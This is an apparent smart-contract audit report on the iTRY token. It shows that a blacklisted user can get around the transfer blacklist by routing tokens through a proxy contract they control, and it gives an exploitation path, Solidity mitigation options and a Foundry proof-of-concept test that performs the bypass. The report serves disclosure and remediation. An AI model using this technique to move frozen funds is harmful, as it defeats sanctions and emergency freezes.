## Title
Blacklisted Users Can Bypass Blacklist Restrictions Using Contract Intermediaries

## Summary
The iTRY token's blacklist enforcement can be circumvented by blacklisted users who control smart contracts holding iTRY tokens. While `_beforeTokenTransfer` validates `msg.sender`, `from`, and `to` addresses for blacklist status, it only checks the immediate caller (the contract), not the ultimate beneficial owner controlling the contract. This allows blacklisted users to freely move their iTRY holdings through contract proxies.

## Impact
**Severity**: High

## Finding Description
**Location:** `src/token/iTRY/iTry.sol` - `_beforeTokenTransfer` function (lines 177-222) [1](#0-0) 

**Intended Logic:** The blacklist mechanism is designed to completely freeze the ability of blacklisted addresses to send, receive, mint, or burn iTRY tokens. The critical invariant states: "Blacklisted users CANNOT send/receive/mint/burn iTRY tokens in ANY case." [2](#0-1) 

**Actual Logic:** The `_beforeTokenTransfer` function only validates that the immediate transaction participants (`msg.sender`, `from`, `to`) are not blacklisted. When a smart contract holds iTRY tokens and initiates a transfer, `msg.sender` becomes the contract address, not the EOA controlling it. If a blacklisted user controls such a contract, they can bypass all blacklist checks.

**Exploitation Path:**
1. **Setup Phase (Before Blacklist)**: User Alice deploys a simple proxy contract (e.g., a wallet contract with a `withdrawToken` function that only Alice can call). Alice transfers 1,000,000 iTRY to this contract.

2. **Blacklist Event**: Alice gets blacklisted due to regulatory/compliance issues. The protocol adds Alice's EOA to the BLACKLISTED_ROLE.

3. **Bypass Execution**: Alice calls her proxy contract's `withdrawToken(recipient, amount)` function. The proxy contract executes `iTRY.transfer(recipient, amount)`.

4. **Successful Transfer**: In the iTRY contract's `_beforeTokenTransfer`:
   - `msg.sender` = ProxyContract (not blacklisted) ✓
   - `from` = ProxyContract (not blacklisted) ✓  
   - `to` = Recipient (not blacklisted) ✓
   
   All checks pass. Alice successfully moved her iTRY tokens despite being blacklisted.

**Security Property Broken:** This violates the critical invariant #2: "Blacklisted users CANNOT send/receive/mint/burn iTRY tokens in ANY case." A blacklisted user can effectively send tokens by controlling an intermediary contract.

## Impact Explanation
- **Affected Assets**: All iTRY tokens held in contracts controlled by blacklisted users
- **Damage Severity**: Complete bypass of the blacklist mechanism. Blacklisted users retain full control over their funds through contract proxies, undermining regulatory compliance and emergency response capabilities. This affects the protocol's ability to freeze malicious actor funds or comply with legal orders.
- **User Impact**: The entire protocol ecosystem is affected. The blacklist feature is critical for:
  - Regulatory compliance (freezing sanctioned addresses)
  - Emergency response to hacks or exploits
  - Legal requirement enforcement
  
  If blacklisted users can bypass restrictions, the protocol loses credibility with regulators and institutional users.

## Likelihood Explanation
- **Attacker Profile**: Any user who anticipates potential blacklisting (sophisticated actors, users in jurisdictions with regulatory uncertainty, or those planning malicious activities)
- **Preconditions**: 
  - User must deploy or control a smart contract
  - User must transfer iTRY to the contract before being blacklisted (or receive tokens at the contract address)
  - The contract itself must not be blacklisted
- **Execution Complexity**: Low - requires only a simple proxy contract deployment and basic contract interaction. The attack can be prepared preventively before any blacklist action occurs.
- **Frequency**: Can be exploited continuously once set up. A sophisticated user could operate multiple proxy contracts to distribute holdings, making blacklist enforcement nearly impossible.

## Recommendation

The blacklist mechanism needs to account for contract-mediated transfers. However, this is architecturally challenging because:
1. Smart contracts legitimately hold and transfer iTRY (e.g., `StakediTry`, `FastAccessVault`, `iTryIssuer`)
2. Distinguishing between legitimate protocol contracts and malicious user proxies is difficult on-chain

**Recommended Mitigation Strategies:**

**Option 1: Whitelist Protocol Contracts**
```solidity
// Add a new role for approved contract holders
bytes32 public constant APPROVED_CONTRACT_ROLE = keccak256("APPROVED_CONTRACT_ROLE");

function _beforeTokenTransfer(address from, address to, uint256) internal virtual override {
    if (transferState == TransferState.FULLY_ENABLED) {
        // ... existing special cases ...
        } else if (
            !hasRole(BLACKLISTED_ROLE, msg.sender) && !hasRole(BLACKLISTED_ROLE, from)
                && !hasRole(BLACKLISTED_ROLE, to)
        ) {
            // FIXED: If msg.sender is a contract, verify it's an approved protocol contract
            if (msg.sender.code.length > 0 && !hasRole(APPROVED_CONTRACT_ROLE, msg.sender)) {
                revert OperationNotAllowed();
            }
            // normal case
        } else {
            revert OperationNotAllowed();
        }
    // ... rest of function
}
```

Grant `APPROVED_CONTRACT_ROLE` to: `StakediTry`, `FastAccessVault`, `iTryIssuer`, `iTrySilo`, and OFT bridge contracts.

**Option 2: EOA-Only Transfers (Stricter)**
```solidity
} else if (
    !hasRole(BLACKLISTED_ROLE, msg.sender) && !hasRole(BLACKLISTED_ROLE, from)
        && !hasRole(BLACKLISTED_ROLE, to)
) {
    // FIXED: Require msg.sender is EOA for non-protocol transfers
    if (msg.sender.code.length > 0) {
        // Only allow if msg.sender is a known protocol contract
        if (!hasRole(MINTER_CONTRACT, msg.sender) && 
            !hasRole(APPROVED_CONTRACT_ROLE, msg.sender)) {
            revert OperationNotAllowed();
        }
    }
    // normal case
}
```

**Option 3: Enhanced Blacklist Manager Powers**
Add functionality for the blacklist manager to recursively blacklist contracts holding funds for blacklisted users. This requires off-chain monitoring and on-chain blacklist updates but maintains flexibility.

**Note:** All options have trade-offs. Option 1 provides the best balance of security and usability for this protocol's architecture where legitimate contracts (vaults, issuers) need to hold and transfer iTRY.

## Proof of Concept

```solidity
// File: test/Exploit_BlacklistBypass.t.sol
// Run with: forge test --match-test test_BlacklistBypassViaContract -vvv

pragma solidity 0.8.20;

import "forge-std/Test.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {iTry} from "../src/token/iTRY/iTry.sol";

// Simple proxy contract that a user controls
contract UserProxy {
    address public owner;
    
    constructor() {
        owner = msg.sender;
    }
    
    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }
    
    // Function to withdraw iTRY tokens - only owner can call
    function withdrawTokens(address token, address recipient, uint256 amount) external onlyOwner {
        iTry(token).transfer(recipient, amount);
    }
}

contract BlacklistBypassTest is Test {
    iTry public itryToken;
    iTry public itryImplementation;
    ERC1967Proxy public itryProxy;
    
    address public admin;
    address public alice;
    address public bob;
    UserProxy public aliceProxy;
    
    bytes32 constant BLACKLISTED_ROLE = keccak256("BLACKLISTED_ROLE");
    bytes32 constant BLACKLIST_MANAGER_ROLE = keccak256("BLACKLIST_MANAGER_ROLE");
    bytes32 constant MINTER_CONTRACT = keccak256("MINTER_CONTRACT");
    
    function setUp() public {
        admin = address(this);
        alice = makeAddr("alice");
        bob = makeAddr("bob");
        
        // Deploy iTry
        itryImplementation = new iTry();
        bytes memory initData = abi.encodeWithSelector(
            iTry.initialize.selector,
            admin,
            admin
        );
        itryProxy = new ERC1967Proxy(address(itryImplementation), initData);
        itryToken = iTry(address(itryProxy));
        
        // Grant blacklist manager role to admin
        itryToken.grantRole(BLACKLIST_MANAGER_ROLE, admin);
        
        // Alice deploys her proxy contract (before being blacklisted)
        vm.prank(alice);
        aliceProxy = new UserProxy();
        
        // Mint some iTRY to Alice's proxy contract
        itryToken.mint(address(aliceProxy), 1_000_000e18);
    }
    
    function test_BlacklistBypassViaContract() public {
        console.log("\n=== EXPLOIT: Blacklist Bypass via Contract Intermediary ===\n");
        
        // SETUP: Verify initial state
        uint256 initialProxyBalance = itryToken.balanceOf(address(aliceProxy));
        uint256 initialBobBalance = itryToken.balanceOf(bob);
        console.log("Initial proxy balance:", initialProxyBalance);
        console.log("Initial Bob balance:", initialBobBalance);
        
        assertEq(initialProxyBalance, 1_000_000e18, "Proxy should have 1M iTRY");
        assertEq(initialBobBalance, 0, "Bob should have 0 iTRY");
        
        // EXPLOIT STEP 1: Alice gets blacklisted
        console.log("\n1. Alice's EOA gets blacklisted...");
        address[] memory blacklistTargets = new address[](1);
        blacklistTargets[0] = alice;
        itryToken.addBlacklistAddress(blacklistTargets);
        
        // Verify Alice is blacklisted
        assertTrue(itryToken.hasRole(BLACKLISTED_ROLE, alice), "Alice should be blacklisted");
        console.log("   Alice is now blacklisted");
        
        // EXPLOIT STEP 2: Verify Alice cannot directly transfer from her EOA
        console.log("\n2. Confirming Alice cannot transfer directly...");
        itryToken.mint(alice, 100e18); // Give Alice some tokens on her EOA
        vm.prank(alice);
        vm.expectRevert(); // Should revert due to blacklist
        itryToken.transfer(bob, 100e18);
        console.log("   Direct transfer from Alice blocked (expected)");
        
        // EXPLOIT STEP 3: Alice bypasses blacklist using her proxy contract
        console.log("\n3. Alice bypasses blacklist via proxy contract...");
        uint256 transferAmount = 500_000e18;
        
        vm.prank(alice);
        aliceProxy.withdrawTokens(address(itryToken), bob, transferAmount);
        
        // VERIFY: Exploit success
        uint256 finalProxyBalance = itryToken.balanceOf(address(aliceProxy));
        uint256 finalBobBalance = itryToken.balanceOf(bob);
        
        console.log("\n=== RESULT ===");
        console.log("Final proxy balance:", finalProxyBalance);
        console.log("Final Bob balance:", finalBobBalance);
        console.log("Amount transferred:", transferAmount);
        
        assertEq(finalProxyBalance, initialProxyBalance - transferAmount, 
                 "Proxy balance should decrease");
        assertEq(finalBobBalance, transferAmount, 
                 "Bob should receive tokens");
        
        console.log("\n[VULNERABILITY CONFIRMED]");
        console.log("Blacklisted user Alice successfully transferred 500,000 iTRY");
        console.log("via her proxy contract, bypassing blacklist restrictions!");
        console.log("This violates the invariant: 'Blacklisted users CANNOT send tokens in ANY case'");
    }
}
```

## Notes

This vulnerability is **distinct from the known Zellic issue** about allowance-based transfers. The known issue states: "Blacklisted user can transfer tokens using allowance on behalf of non-blacklisted users (_beforeTokenTransfer doesn't validate msg.sender)". 

However, examining the current code shows that `msg.sender` IS validated at line 190. This suggests the Zellic issue may have been partially addressed by adding the `msg.sender` check.

The **contract intermediary bypass** is a different attack vector:
- Known issue: Blacklisted users using `transferFrom` with allowances from non-blacklisted users
- This issue: Blacklisted users controlling smart contracts that hold and transfer their own iTRY

The contract intermediary approach is more powerful because:
1. No allowance needed from other users
2. Works even after the `msg.sender` validation was added
3. Can be set up preventively before any blacklist action
4. Harder to detect and counter since contracts legitimately hold protocol assets

The fix requires either whitelisting approved protocol contracts or restricting contract-initiated transfers, both of which have architectural implications for the protocol's vault and bridge contracts that legitimately hold iTRY.

### Citations

**File:** src/token/iTRY/iTry.sol (L177-196)
```text
    function _beforeTokenTransfer(address from, address to, uint256) internal virtual override {
        // State 2 - Transfers fully enabled except for blacklisted addresses
        if (transferState == TransferState.FULLY_ENABLED) {
            if (hasRole(MINTER_CONTRACT, msg.sender) && !hasRole(BLACKLISTED_ROLE, from) && to == address(0)) {
                // redeeming
            } else if (hasRole(MINTER_CONTRACT, msg.sender) && from == address(0) && !hasRole(BLACKLISTED_ROLE, to)) {
                // minting
            } else if (hasRole(DEFAULT_ADMIN_ROLE, msg.sender) && hasRole(BLACKLISTED_ROLE, from) && to == address(0)) {
                // redistributing - burn
            } else if (hasRole(DEFAULT_ADMIN_ROLE, msg.sender) && from == address(0) && !hasRole(BLACKLISTED_ROLE, to))
            {
                // redistributing - mint
            } else if (
                !hasRole(BLACKLISTED_ROLE, msg.sender) && !hasRole(BLACKLISTED_ROLE, from)
                    && !hasRole(BLACKLISTED_ROLE, to)
            ) {
                // normal case
            } else {
                revert OperationNotAllowed();
            }
```

**File:** README.md (L124-124)
```markdown
- Blacklisted users cannot send/receive/mint/burn iTry tokens in any case.
```
